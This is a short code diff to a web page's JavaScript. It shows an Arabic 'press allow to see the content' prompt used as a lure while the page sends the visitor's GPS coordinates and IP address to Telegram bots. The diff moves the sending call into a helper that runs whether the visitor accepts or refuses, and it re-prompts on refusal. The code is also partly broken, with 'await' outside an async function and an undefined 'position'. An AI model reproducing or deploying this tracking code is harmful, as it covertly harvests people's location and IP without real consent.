@@ -147,11 +147,14 @@ ${ipAddress}
     }
     return {};
   }
-
+async function yourFunction() {
+  // Your code here
+  await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+}
 
 function showAlert() {
 
-await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
 
     const result = window.confirm("اضغط سماح عشان تشوف المحتوي");
     if (result) {
@@ -160,12 +163,13 @@ await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.
 
 
 
-await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-
+//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+yourFunction();
     } else {
 
 
-await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+yourFunction();
       // Deny button clicked or dialog closed
     //  console.log("Denied");
 showAlert();
